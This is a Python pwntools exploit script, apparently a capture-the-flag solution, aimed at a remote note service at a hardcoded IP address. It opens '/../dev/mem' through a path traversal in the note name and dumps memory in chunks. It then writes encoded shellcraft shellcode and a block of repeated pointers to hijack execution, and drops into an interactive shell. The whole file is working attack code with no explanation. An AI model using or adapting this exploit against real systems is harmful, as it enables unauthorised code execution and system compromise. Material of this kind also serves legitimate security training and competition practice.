from pwn import *
import string

context.arch = 'amd64'

#proc = process("./run.sh")
proc = remote("3.115.128.152", 3154)

def read(cnt):
    proc.recvuntil("Choose one:\r\n")
    proc.sendline("2")

    proc.recvuntil("Size?\r\n")
    proc.sendline(str(cnt))

    proc.recvuntil('\r\n')

    leak = ''
    while len(leak) != cnt:
        leak += proc.recv(cnt - len(leak))

    return leak

def encode_str(s):
    fin = ''
    for c in s:
        if c in string.printable:
            fin += c
        else:
            fin += "\x16"
            fin += c
    return fin

def write(payload):
    proc.recvuntil("Choose one:\r\n")
    proc.sendline("1")

    proc.recvuntil("Size?\r\n")
    proc.sendline(str(len(payload)))

    proc.recvuntil('\r\n')

    proc.sendline(encode_str(payload))

proc.recvuntil("note?\r\n")
proc.sendline("/../dev/mem")

size = 0x10000

for i in range(0, 0x380000, size):
    leak = read(size)
    print(hex(i), hex(len(leak)))

payload = encoders.encoder.line(asm(shellcraft.sh()))
write(payload)

for i in range(0, 0x570000, size):
    leak = read(size)
    print(hex(i), hex(len(leak))) 

read(0x3a0)

payload = p64(0x60380000) * 33
write(payload)

context.log_level = 'debug'

proc.interactive()